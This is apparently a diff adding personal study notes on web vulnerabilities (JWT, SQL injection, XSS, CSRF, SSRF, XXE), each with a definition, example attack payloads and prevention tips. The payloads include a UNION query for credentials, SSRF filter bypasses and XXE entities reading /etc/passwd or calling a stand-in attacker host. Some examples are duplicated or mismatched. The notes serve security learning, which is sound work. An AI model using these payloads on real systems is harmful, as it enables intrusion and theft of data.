@@ -1,0 +1,230 @@
+1. JWT Attack
+    Use - JWTs are most commonly used in authentication, session management, and access control mechanisms.
+          JWT is JSON Web Token which standardized format for sending cryptographically signed JSON data between systems.
+
+    JWT Format -
+            Header - Its contain type of token and signing Token algorithm
+            Payload - It contain the claims means user data like id,name,role,email.
+            Signature - it contain Signature. its is used to verify the message wasn't changed along the way in transit.
+
+    JWT Signature - JWS and JWE
+        JWT can generate token either Hashing Header and Payload or using a Secret key.
+        JWS(Default) - JSON Web Signature
+                - encoded the token (BASE64)
+        JWE - JSON Web Encryption
+                -  actual contents of the token are encrypted rather than just encoded.
+
+    JWT Attack -
+        User sending modified JWTs to the server. this goal is to bypass authentication and access controls by impersonating another user who has already been authenticated.
+
+    HOW  happens -
+        JWT vulnerabilities typically arise due to flawed JWT handling within the application itself.Improper Development of JWT  Verification.
+        1. Exploiting flawed JWT signature verification
+            - Accepting arbitrary signatures
+            - Accepting tokens with no signature
+        2. Brute-forcing secret keys
+            - Brute-forcing secret keys using hashcat
+        3. JWT header parameter injections - alg is mandatory, jwk(Key),jku(Set Url),kid(Key ID) is not
+            - Injecting self-signed JWTs via the jwk parameter
+            - Injecting self-signed JWTs via the jku parameter
+            - Injecting self-signed JWTs via the kid parameter
+
+    Prevention -
+        - Train developers
+        - Use an up-to-date library for handling JWT
+
+2. SQL Injection
+    User-supplied data is not validated, filtered, or sanitized by the application to interpreter.Used of object-relational mapping (ORM) search parameters to extract additional, sensitive records.(first_name, last_name in sql).Some of the more common injections are SQL, NoSQL, OS command, Object Relational Mapping (ORM), LDAP.
+
+    Types -
+        - Retrieving hidden data - where you can modify an SQL query to return additional results.
+            Original - https://insecure-website.com/products?category=Gifts
+                       SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+            Attacker login - https://insecure-website.com/products?category=Gifts'--
+                             SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
+
+        - Subverting application logic - where you can change a query to interfere with the application's logic.
+            Original - SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
+
+            Attacker login - SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
+
+        - Retrieving data from other database tables - leveraging vulnerability to retrieve other DB tables
+            Original - SELECT name, description FROM products WHERE category = 'Gifts'
+
+            Attacker Login - ' UNION SELECT username, password FROM users--
+
+        - UNION attacks - where you can retrieve data from different database tables.
+            Original - SELECT name, description FROM products WHERE category = 'Gifts'
+
+            Attacker Login - ' UNION SELECT username, password FROM users--
+
+        - Examining the database - where you can extract information about the version and structure of the database.
+            Attack login - SELECT * FROM v$version
+                           SELECT * FROM information_schema.tables
+
+    Blind SQL injection - where the results of a query you control are not returned in the application's responses.
+        - conditionally trigger a time delay in the processing of the query
+        - conditionally triggering an error such as a divide-by-zero(Logic change)
+        - trigger an out-of-band network interaction, using OAST techniques. This technique is extremely powerful and works in situations where the other techniques do not.
+
+    How to Detect -
+        - use parameter ' and look for error
+        - submit sql specific syntax and check for application behavior or responses
+        - submit boolean condition such as OR 1=1 and OR 1=2 and look for Application behavior or responses
+        - Submitting payloads designed to trigger time delays when executed within an SQL query
+        - Submitting OAST payloads designed to trigger an out-of-band network
+
+    Stored SQL injection (Second Order) -  application takes user input from an HTTP request and stores it for future use.
+
+    Prevention - prevented by using parameterized queries also known as prepared statements
+
+3. Cross Site Scripting (XSS)
+    The malicious content sent to the web browser in form of JS,HTML,flash code that browser execute.
+
+    XSS POC -
+        uses alert() function. for chrome browser use print() function.
+
+    Types -
+        - Reflected XSS - where the malicious script comes from the current HTTP request.
+            Original - https://insecure-website.com/status?message=All+is+well.
+                        <p>Status: All is well.</p>
+
+            Attacker Logic - https://insecure-website.com/status?message=<script>/*+Bad+stuff+here...+*/</script>
+                        <p>Status: <script>/* Bad stuff here... */</script></p>
+
+        - Stored XSS (Second order) - where the malicious script comes from the website's database.web application gathers malicious input from a user and then stores that input in a data store for later use.
+            Original -
+                    <input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com" />
+
+            Attacker Logic -
+                    <input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com"> MALICIOUS CODE <!-- />
+
+        - DOM-based XSS - where the vulnerability exists in client-side code rather than server-side code.Controls the flow of the code by using elements of the Document Object Model (DOM) along with code crafted by the attacker to change the flow.
+
+            Original -
+                var search = document.getElementById('search').value;
+                var results = document.getElementById('results');
+                results.innerHTML = 'You searched for: ' + search;
+
+            Attacker Logic - You searched for: <img src=1 onerror='/* Bad stuff here... */'>
+
+    Prevention -
+        - use CSP
+        - use same origin policy
+        - filter or sanitized user input data
+        - use Content-Type and X-Content-Type-Options
+
+4. Cross-site Request Forgery (CSRF)
+    A vulnerability that allows an attacker to induce users to perform actions that they do not intend to perform.
+
+    condition to meet CSRF -
+        Action - such as modifying permissions for other users or such as changing the user's own password
+        Cookie-based Session handling - application relies solely on session cookies to identify the user who has made the requests.
+        no unpredictable request parameter - a secret parameter
+
+    How happens -
+        - improper developed code
+        - improper validation of CSRF token implemented in code
+        - Validation of CSRF token depends on request method
+        - Validation of CSRF token depends on token being present
+        - CSRF token is not tied to the user session
+        - CSRF token is tied to a non-session cookie
+        - CSRF token is simply duplicated in a cookie
+
+    Prevention -
+        - Train developer
+        - SameSite cookies
+        - CSRF Token with random generate properties
+        - Tied to user session
+        - Strictly validated in every case before the relevant action is executed.
+
+    https://www.synopsys.com/glossary/what-is-csrf.html
+
+5. Server-side Request Forgery (SSRF)
+    Vulnerability that allows an attacker to induce the server-side application to make requests to an unintended location.
+
+    Types -
+       - SSRF attacks against the server itself - attacker induces the application to make an HTTP request to server itself
+            Original - stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
+
+            Attacker Logic - stockApi=http://localhost/admin
+
+       - SSRF attacks against other back-end systems - attacker induces the application to make an HTTP request to back-end services
+            Original - stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
+
+            Attacker Logic - stockApi=http://192.168.0.68/admin
+\
+       - SSRF with blacklist-based input filters - some app block input like 127.0.0.1 and localhost so attacker change represent
+            Original - 127.0.0.1
+
+            Attacker Login - 2130706433, 017700000001. 127.1, Obfuscating with encoder
+
+       - SSRF with whitelist-based input filters
+            with @, #, FQDN
+                https://expected-host@evil-host - with @
+                https://evil-host#expected-host - with #
+                https://expected-host.evil-host - with FQDN
+
+       - Bypassing SSRF filters via open redirection
+            Original - stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
+
+            Attacker Logic - stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
+
+       - Blind SSRF
+            Blind SSRF vulnerabilities arise when an application can be induced to issue a back-end HTTP request to a supplied URL, but the response from the back-end request is not returned in the application's front-end response.
+
+    Prevention -
+        - Whitelist Domains in DNS
+        - Do Not Send Raw Responses
+        - Enforce URL Schemas
+        - Enable Authentication on All Services
+        - Sanitize and Validate Inputs
+
+6. XML External Entity injection (XXE)
+    Vulnerability that allows an attacker to interfere with an application's processing of XML data. It often allows an attacker to view files on the application server filesystem, and to interact with any back-end or external systems that the application itself can access.
+
+    How happens -
+        Some applications use the XML format to transmit data between the browser and the server. Applications that do this virtually always use a standard library or platform API to process the XML data on the server.
+
+    Types -
+        - Exploiting XXE to retrieve files - where an external entity is defined containing the contents of a file, and returned in the application's response.(!DOCTYPE)
+            Original - <?xml version="1.0" encoding="UTF-8"?>
+                        <stockCheck><productId>381</productId></stockCheck>
+
+            Attacker Logic -<?xml version="1.0" encoding="UTF-8"?>
+                            <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+                            <stockCheck><productId>&xxe;</productId></stockCheck>
+
+        - Exploiting XXE to perform SSRF attacks - where an external entity is defined based on a URL to a back-end system.(SSRF Attack)
+            Original - <?xml version="1.0" encoding="UTF-8"?>
+                        <stockCheck><productId>381</productId></stockCheck>
+
+            Attacker Logic - <?xml version="1.0" encoding="UTF-8"?>
+                            <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal.vulnerable-website.com/"> ]>
+                            <stockCheck><productId>&xxe;</productId></stockCheck>
+
+
+        - Exploiting blind XXE exfiltrate data out-of-band - where sensitive data is transmitted from the application server to a system that the attacker controls. (% character )
+             Original - <?xml version="1.0" encoding="UTF-8"?>
+                        <stockCheck><productId>381</productId></stockCheck>
+
+            Attacker Logic - <?xml version="1.0" encoding="UTF-8"?>
+                            <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
+                            <stockCheck><productId>&xxe;</productId></stockCheck>
+
+        - Exploiting blind XXE to retrieve data via error messages - where the attacker can trigger a parsing error message containing sensitive data.(Error Based )
+             Original - <?xml version="1.0" encoding="UTF-8"?>
+                        <stockCheck><productId>381</productId></stockCheck>
+
+            Attacker Logic - <?xml version="1.0" encoding="UTF-8"?>
+                            <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://f2g9j7hhkax.web-attacker.com"> %xxe; ]>
+                            <stockCheck><productId>&xxe;</productId></stockCheck>
+
+    Prevention -
+        - Disable unnecessary features
+        - Disable resolution of external entities
+        - disable support for XInclude
+
+------------------------------------------------------------------------------------------------------------------------------------
+OAST - Out-of-band application security
+DTD - Document Type Definition
